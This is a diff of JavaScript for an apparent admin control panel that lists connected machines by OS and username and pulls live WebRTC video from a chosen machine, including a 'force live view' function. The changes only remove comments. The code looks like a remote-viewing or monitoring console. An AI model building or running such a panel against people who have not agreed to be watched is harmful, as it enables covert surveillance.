@@ -116,7 +116,6 @@
                 else if (data.type === 'user_update') {
                     addLog(`🟢 New User: ${data.info.os || 'Unknown'} (${data.info.user || 'Unknown'})`, 'green');
 
-                    // FIX: Prevent duplicates/spam
                     if (!users[data.id]) {
                         users[data.id] = { status: 'Online', logs: [], info: data.info, lastSeen: data.lastSeen, sessionActive: false };
                     } else {
@@ -128,8 +127,7 @@
                     renderUsers();
                 } 
                 else if (data.type === 'refresh_users') {
-                    // Fetch all users from DB logic would go here if we had an API endpoint
-                    // For now, we rely on real-time updates
+                    // Refresh logic handled by real-time updates
                 }
                 else if (data.type === 'heartbeat') {
                     if (users[data.id]) {
@@ -191,12 +189,11 @@
                     pc: new RTCPeerConnection({
                         iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                     }),
-                    candidates: [] // Queue for early candidates
+                    candidates: []
                 };
 
                 const pc = sessions[targetId].pc;
 
-                // FIX: This ensures the video player actually gets the stream
                 pc.ontrack = (event) => {
                     remoteVideo.srcObject = event.streams[0];
                     addLog(`[VIDEO] Stream received from ${targetId}`, 'green');
@@ -235,7 +232,6 @@
             try {
                 await pc.setRemoteDescription(new RTCSessionDescription(offerSDP));
 
-                // Apply any queued candidates now that we have the remote description
                 while (session.candidates.length > 0) {
                     const candidate = session.candidates.shift();
                     await pc.addIceCandidate(new RTCIceCandidate(candidate));
@@ -260,11 +256,9 @@
             const session = getSession(targetId);
 
             if (session.pc.remoteDescription) {
-                // If remote description is set, add candidate immediately
                 session.pc.addIceCandidate(new RTCIceCandidate(candidate))
                     .catch(err => addLog(`[WEBRTC] Error adding candidate: ${err.message}`, 'red'));
             } else {
-                // Queue candidate if remote description is not yet set
                 session.candidates.push(candidate);
             }
         }
@@ -344,7 +338,6 @@
         }
 
         function joinUser(id, status) {
-            // If we have stored signaling data, send it back
             if (users[id] && users[id].signalingData) {
                 const sigData = users[id].signalingData;
                 ws.send(JSON.stringify({
@@ -355,7 +348,6 @@
                 }));
                 addLog(`[ADMIN] Resent ${sigData.type} to ${id}`, 'green');
             } else {
-                // Request a new join
                 ws.send(JSON.stringify({
                     type: 'request_join',
                     targetId: id,
@@ -364,7 +356,6 @@
                 addLog(`[ADMIN] Requested new join to ${id}`, 'blue');
             }
 
-            // Visual feedback
             const card = document.querySelector(`button[onclick="joinUser('${id}', '${status}')"]`).parentElement;
             card.style.borderColor = '#4ade80';
             setTimeout(() => card.style.borderColor = '#3b82f6', 500);
@@ -372,11 +363,9 @@
 
         function forceLiveView(id) {
             addLog(`[FORCE] Forcing live view for ${id}`, 'yellow');
-            // Close any existing session for this ID to clear black frames
             if (sessions[id]) {
                 closeSession(id);
             }
-            // Request a fresh join
             ws.send(JSON.stringify({
                 type: 'request_join',
                 targetId: id,
@@ -385,8 +374,6 @@
         }
 
         function forceLiveViewFromFrame() {
-            // Get the current user ID from the active session or last joined
-            // Since we don't store which ID is currently viewing, we'll just force refresh the last active one or the first one
             const ids = Object.keys(sessions);
             if(ids.length > 0) {
                 const lastId = ids[ids.length - 1];
@@ -409,7 +396,6 @@
 
         function closeVideo() {
             document.getElementById('videoModal').style.display = 'none';
-            // Close all active sessions
             Object.keys(sessions).forEach(sid => closeSession(sid));
             remoteVideo.srcObject = null;
         }
